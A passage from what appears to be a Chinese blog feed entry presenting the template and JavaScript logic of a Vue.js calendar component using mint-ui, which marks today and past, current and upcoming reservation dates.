class="string">"clickData"</span>&gt;</span>&#123;&#123;showDate&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    // 今天的日期 2019-6-6</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"now-time"</span>&gt;</span>今日：&#123;&#123;exactTime&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    // 日历组件</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"calendar"</span>&gt;</span></span><br><span class="line">    // 日历组件头部</span><br><span class="line">      <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"calendar-header"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>日<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>一<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>二<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>三<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>四<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>五<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>六<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    // 日历组件主体</span><br><span class="line">      <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"calendar-body"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"calendar-row"</span> <span class="attr">v-for</span>=<span class="string">"(item, index) in JSON.parse(calendarData)"</span> <span class="attr">:key</span>=<span class="string">"index"</span>&gt;</span></span><br><span class="line">          // 注意给 不同的日子加类名</span><br><span class="line">          // 周末：weekend  工作日：weekday</span><br><span class="line">          // 过去的事项 already-time 今天的事项 exact-time 将来的事项 soon-time</span><br><span class="line">          // 给有事项的日子实现点击弹框，显示这天的事项内容</span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-for</span>=<span class="string">"(subItem, subIndex) in item"</span> <span class="attr">:class</span>=<span class="string">"[subIndex == 0 || subIndex == 6? 'weekend': 'weekday', subItem.type == '1'? 'exact-time': '', subItem.type == '0'? 'already-time': '', subItem.type == '2'? 'soon-time': '']"</span> @<span class="attr">click</span>=<span class="string">"showInfo(subItem)"</span> <span class="attr">:key</span>=<span class="string">"subIndex"</span>&gt;</span></span><br><span class="line">            &#123;&#123;subItem.date&#125;&#125;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    // popup 和 picker 搭配，实现 年月 选择   mint-ui 库</span><br><span class="line">    <span class="tag">&lt;<span class="name">mt-popup</span> <span class="attr">v-model</span>=<span class="string">"popupVisible"</span> <span class="attr">position</span>=<span class="string">"bottom"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">mt-picker</span> <span class="attr">:slots</span>=<span class="string">"slots"</span> <span class="attr">:showToolbar</span>=<span class="string">"true"</span> <span class="attr">:visibleItemCount</span>=<span class="string">"5"</span> <span class="attr">:itemHeight</span>=<span class="string">"itemsHeight"</span> <span class="attr">ref</span>=<span class="string">"picker"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"@/assets/images/picker_cancel.png"</span> <span class="attr">class</span>=<span class="string">"picker_cancel"</span> <span class="attr">v-on:click</span>=<span class="string">"cancelFunc()"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> =<span class="string">"@/assets/images/picker_sure.png"</span> <span class="attr">class</span>=<span class="string">"picker_sure"</span> <span class="attr">v-on:click</span>=<span class="string">"sureFunc()"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">mt-picker</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mt-popup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>日历子组件逻辑：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; MessageBox &#125; <span class="keyword">from</span> <span class="string">'mint-ui'</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  name: <span class="string">"calendar"</span>,</span><br><span class="line">  props: &#123;</span><br><span class="line">    propsTime: <span class="built_in">String</span>,</span><br><span class="line">    propsInfoList: <span class="built_in">String</span></span><br><span class="line">  &#125;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="comment">// 接收父组件传值 '2019-06'</span></span><br><span class="line">      time: <span class="string">''</span>,</span><br><span class="line">      <span class="comment">// 接收父组件数据列表</span></span><br><span class="line">      infoList: <span class="string">''</span>,</span><br><span class="line">      <span class="comment">// 日历组件</span></span><br><span class="line">      calendarData: [],</span><br><span class="line">      <span class="comment">// 页面展示的 '年-月'</span></span><br><span class="line">      showDate: <span class="string">''</span>,</span><br><span class="line">      <span class="comment">// 当前的 '年-月-日'</span></span><br><span class="line">      exactTime: <span class="string">''</span>,</span><br><span class="line">      <span class="comment">// picker 高度</span></span><br><span class="line">      itemsHeight: <span class="number">95</span> * <span class="built_in">window</span>.screen.height / <span class="number">1334</span>,</span><br><span class="line">      <span class="comment">// pupop 显示</span></span><br><span class="line">      popupVisible: <span class="literal">false</span>,</span><br><span class="line">      <span class="comment">// picker 数据</span></span><br><span class="line">      slots: []</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  created() &#123;</span><br><span class="line">    <span class="comment">// 拿到父组件的 list</span></span><br><span class="line">    <span class="keyword">this</span>.infoList = <span class="keyword">this</span>.propsInfoList</span><br><span class="line">    <span class="comment">// 拿到父组件的 '2019-06'</span></span><br><span class="line">    <span class="keyword">this</span>.time = <span class="keyword">this</span>.propsTime.split(<span class="string">'-'</span>)</span><br><span class="line">    <span class="comment">// 获取今天 '2019-06-06'</span></span><br><span class="line">    <span class="keyword">const</span> date = <span class="keyword">this</span>.getToday()</span><br><span class="line">    <span class="keyword">this</span>.exactTime = date.slice(<span class="number">0</span>,<span class="number">3</span>).join(<span class="string">'-'</span>)</span><br><span class="line">    <span class="comment">// 日历组件</span></span><br><span class="line">    <span class="keyword">this</span>.getCalendar(...(<span class="keyword">this</span>.time))</span><br><span class="line">    <span class="comment">// 组装 picker 数组</span></span><br><span class="line">    <span class="keyword">this</span>.getSlotsArray(...(date.slice(<span class="number">0</span>,<span class="number">2</span>)))</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    <span class="comment">// 日历组件</span></span><br><span class="line">    getCalendar(year, month) &#123;</span><br><span class="line">      <span class="keyword">let</span> _this = <span class="keyword">this</span></span><br><span class="line">      <span class="comment">// 转存当天 '2019-06-06'</span></span><br><span class="line">      <span class="keyword">const</span> rightNow = _this.exactTime</span><br><span class="line">      <span class="comment">// 拼接 显示日历上的年月 '2019-05'</span></span><br><span class="line">      _this.showDate = <span class="string">`<span class="subst">$&#123;year&#125;</span>-<span class="subst">$&#123;month&#125;</span>`</span></span><br><span class="line">      <span class="comment">// 获取当月的第一天</span></span><br><span class="line">      <span class="keyword">const</span> firstDate = <span class="keyword">new</span> <span class="built_in">Date</span>(year, month - <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">      <span class="comment">// 获取第一天周几</span></span><br><span class="line">      <span class="keyword">const</span> firstDay = firstDate.getDay()</span><br><span class="line">      <span class="comment">// 判断是否为闰年</span></span><br><span class="line">      <span class="keyword">const</span> isLeapYear = year % <span class="number">100</span> == <span class="number">0</span>? year % <span class="number">400</span> == <span class="number">0</span>? <span class="number">1</span>: <span class="number">0</span>: year % <span class="number">4</span> == <span class="number">0</span> ? <span class="number">1</span>: <span class="number">0</span></span><br><span class="line">      <span class="comment">// 获取今年每个月的天数</span></span><br><span class="line">      <span class="keyword">const</span> monthArray = [<span class="number">31</span>, <span class="number">28</span> + isLeapYear, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>]</span><br><span class="line">      <span class="comment">// 计算星期的行数</span></span><br><span class="line">      <span class="keyword">const</span> weeekLines =<span class="built_in">Math</span>.ceil((monthArray[month - <span class="number">1</span>] + firstDay)/<span class="number">7</span>)</span><br><span class="line">      <span class="keyword">let</span> calendar = []</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; weeekLines; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> weeekLinesInfo = []</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">7</span>; j++) &#123;</span><br><span class="line">          <span class="comment">// 计算每个单元格的序号</span></span><br><span class="line">          <span class="keyword">const</span> cellNo = i * <span class="number">7</span> + j</span><br><span class="line">          <span class="comment">// 计算每个单元格应该填充的日期</span></span><br><span class="line">          <span class="keyword">const</span> datePerLine = cellNo - firstDay + <span class="number">1</span></span><br><span class="line">          <span class="comment">// 排除空白格</span></span><br><span class="line">          <span class="keyword">if</span>(datePerLine &lt;= <span class="number">0</span> || datePerLine &gt; monthArray[month - <span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="comment">// 不存在的显示为 null 和 ''</span></span><br><span class="line">            <span class="keyword">let</span> outOfMonth = &#123;</span><br><span class="line">              <span class="string">"type"</span> : <span class="string">'null'</span>,</span><br><span class="line">              <span class="string">"date"</span> : <span class="string">''</span></span><br><span class="line">            &#125;</span><br><span class="line">            weeekLinesInfo[j] = outOfMonth</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> day = (datePerLine + <span class="string">''</span>).padStart(<span class="number">2</span>,<span class="string">'0'</span>)</span><br><span class="line">            <span class="keyword">let</span> inOfMonth = &#123;</span><br><span class="line">              <span class="string">"type"</span> : <span class="string">''</span>,</span><br><span class="line">              <span class="string">"date"</span> : day,</span><br><span class="line">              <span class="string">"isDone"</span>: <span class="string">''</span>,</span><br><span class="line">              <span class="string">"infor"</span>: <span class="string">''</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 今天背景变成一个红圈,这是今天 =&gt; rightNow</span></span><br><span class="line">            <span class="keyword">const</span> propsDate = <span class="string">`<span class="subst">$&#123;year&#125;</span>-<span class="subst">$&#123;month&#125;</span>-<span class="subst">$&#123;day&#125;</span>`</span></span><br><span class="line">            <span class="comment">// 比较每月的今天</span></span><br><span class="line">            <span class="keyword">if</span>(propsDate == rightNow)&#123;</span><br><span class="line">              inOfMonth.type = <span class="string">"1"</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">const</span> reservations = <span class="built_in">JSON</span>.parse(_this.infoList)</span><br><span class="line">            <span class="comment">// 将 父组件传的 list 赋值在日历上</span></span><br><span class="line">            <span class="comment">// 预定列表 和 当月每一天比较</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">let</span> k = <span class="number">0</span>; k &lt; reservations.length; k++) &#123;</span><br><span class="line">              <span class="keyword">if</span>(propsDate == reservations[k].date)&#123;</span><br><span class="line">                <span class="comment">// inOfMonth.type = "1"</span></span><br><span class="line">                inOfMonth.infor = reservations[k].info</span><br><span class="line">                <span class="keyword">if</span>(rightNow == reservations[k].date) &#123;</span><br><span class="line">                  inOfMonth.type = <span class="string">"1"</span></span><br><span class="line">                  inOfMonth.isDone = <span class="string">"doing"</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rightNow &gt; reservations[k].date) &#123;</span><br><span class="line">                  inOfMonth.type = <span class="string">"0"</span></span><br><span class="line">                  inOfMonth.isDone = <span class="string">"pass"</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rightNow &lt; reservations[k].date) &#123;</span><br><span class="line">                  inOfMonth.type = <span class="string">"2"</span></span><br><span class="line">                  inOfMonth.isDone = <span class="string">"will"</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            weeekLinesInfo[j] = inOfMonth</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        calendar.push(weeekLinesInfo)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">window</span>.console.log(calendar)</span><br><span class="line">      <span class="comment">// 即将遍历二维数组</span></span><br><span class="line">      _this.calendarData = <span class="built_in">JSON</span>.stringify(calendar)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 格式化当前日期 YYYY-MM-DD</span></span><br><span class="line">    getToday() &#123;</span><br><span class="line">      <span class="keyword">let</span> nowDate = <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">      <span class="keyword">let</span> yy = nowDate.getFullYear().toString()</span><br><span class="line">      <span class="keyword">let</span> mm = (nowDate.getMonth() + <span class="number">1</span> + <span class="string">''</span>).padStart(<span class="number">2</span>,<span class="string">'0'</span>)</span><br><span class="line">      <span class="keyword">let</span> dd = (nowDate.getDate() + <span class="string">''</span>).padStart(<span class="number">2</span>,<span class="string">'0'</span>)</span><br><span class="line">      <span class="keyword">let</span> hh = nowDate.getHours().toString().padStart(<span class="number">2</span>,<span class="string">'0'</span>)</span><br><span class="line">      <span class="keyword">let</span> mt = (nowDate.getMinutes() + <span class="string">''</span>).padStart(<span class="number">2</span>,<span class="string">'0'</span>)</span><br><span class="line">      <span class="keyword">let</span> ss = (nowDate.getSeconds() + <span class="string">''</span>).padStart(<span class="number">2</span>,<span class="string">'0'</span>)</span><br><span class="line">      <span class="keyword">return</span> [yy, mm, dd, hh, mt, ss]</span><br><span class="line">      <span class="comment">// return `$&#123;yy&#125;-$&#123;mm&#125;-$&#123;dd&#125;-$&#123;hh&#125;-$&#123;mt&#125;-$&#123;ss&#125;`</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 组装 picker 数组</span></span><br><span class="line">    getSlotsArray(year, month)&#123;</span><br><span class="line">      <span class="keyword">let</span> _this = <span class="keyword">this</span></span><br><span class="line">      <span class="keyword">let</span> yearArray = []</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">-10</span> ; i &lt;= <span class="number">10</span> ; i ++)&#123;</span><br><span class="line">        yearArray.push(year - <span class="number">1</span> + i)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">let</span> monthArray = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]</span><br><span class="line">      <span class="keyword">let</span> slots = [</span><br><span class="line">        &#123;</span><br><span class="line">          values:yearArray,</span><br><span class="line">          className:<span class="string">"slot1"</span>,</span><br><span class="line">          defaultIndex: <span class="number">11</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          values:monthArray,</span><br><span class="line">          className:<span class="string">"slot2"</span>,</span><br><span class="line">          defaultIndex:month - <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">      _this.slots = slots</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 显示日期弹窗</span></span><br><span class="line">    clickData()&#123;</span><br><span class="line">      <span class="keyword">this</span>.popupVisible = <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 取消按钮</span></span><br><span class="line">    cancelFunc()&#123;</span><br><span class="line">      <span class="keyword">this</span>.popupVisible = <span class="literal">false</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 确认按钮</span></span><br><span class="line">    sureFunc() &#123;</span><br><span class="line">      <span class="keyword">let</span> _this = <span class="keyword">this</span></span><br><span class="line">      _this.popupVisible = <span class="literal">false</span></span><br><span class="line">      <span class="keyword">const</span> clickData = _this.$refs.picker.getValues()</span><br><span class="line">      <span class="keyword">const</span> year = clickData[<span class="number">0</span>] + <span class="string">''</span></span><br><span class="line">      <span class="keyword">const</span> month = (clickData[<span class="number">1</span>] + <span class="string">''</span>).padStart(<span class="number">2</span>,<span class="string">'0'</span>)</span><br><span class="line">      <span class="keyword">const</span> day = _this.time[<span class="number">2</span>]</span><br><span class="line">      _this.getDateInfo(year, month)</span><br><span class="line">      _this.getCalendar(year, month)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 调用父组件定义的方法</span></span><br><span class="line">    getDateInfo(year, month) &#123;</span><br><span class="line">      <span class="keyword">this</span>.$emit(<span class="string">'getDateInfo'</span>, year, month)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 点击展示某天的事项信息</span></span><br><span class="line">    showInfo(info) &#123;</span><br><span class="line">      <span class="keyword">let</span> _this = <span class="keyword">this</span></span><br><span class="line">      <span class="keyword">const</span> infor = info</span><br><span class="line">      <span class="keyword">if</span>(infor.infor) &#123;</span><br><span class="line">        <span class="keyword">const</span> [year, month] = _this.showDate.split(<span class="string">'-'</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(year, month, info)</span><br><span class="line">        <span class="keyword">const</span> titleDate = <span class="string">`<span class="subst">$&#123;year&#125;</span>-<span class="subst">$&#123;month&#125;</span>-<span class="subst">$&#123;info.date&#125;</span>`</span></span><br><span class="line">        <span class="keyword">const</span> preview = info.infor</span><br><span class="line">        MessageBox(&#123;</span><br><span class="line">          title: titleDate,</span><br><span class="line">          message: preview,</span><br><span class="line">          showCancelButton: <span class="literal">false</span>,</span><br><span class="line">          closeOnClickModal: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他：为了减少篇幅，省略样式</p><p><a href="https://github.com/houfee" target="_blank" rel="noopener">github地址</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;日历组件&quot;&gt;&lt;a href=&quot;#日历组件&quot; class=&quot;headerlink&quot; title=&quot;日历组件&quot;&gt;&lt;/a&gt;日历组件&lt;/h1&gt;&lt;h2 id=&quot;效果&quot;&gt;&lt;a href=&quot;#效果&quot; class=&quot;headerlink&quot; title=&quot;效果&quot;&gt;&lt;/a&gt;效果&lt;/h
      
    
    </summary>
    
      <category term="vue.js" scheme="http://yoursite.com/categories/vue-js/"/>
    
    
      <category term="vue.js" scheme="http://yoursite.com/tags/vue-js/"/>
    
  </entry>
  
</feed>
